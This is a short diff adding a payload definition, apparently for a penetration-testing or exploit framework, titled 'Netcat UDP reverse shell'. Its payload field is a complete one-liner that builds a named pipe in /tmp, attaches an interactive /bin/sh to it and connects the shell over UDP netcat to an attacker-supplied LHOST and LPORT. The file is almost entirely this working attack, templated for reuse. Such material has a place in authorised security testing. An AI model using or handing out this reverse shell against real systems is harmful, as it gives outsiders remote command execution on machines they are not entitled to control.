@@ -1,0 +1,5 @@
+title=Netcat UDP reverse shell
+info=Useful with nc with no -e option
+required_opts=LHOST;LPORT
+connector=reverse_udp_netcat
+payload=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u LHOST LPORT >/tmp/f
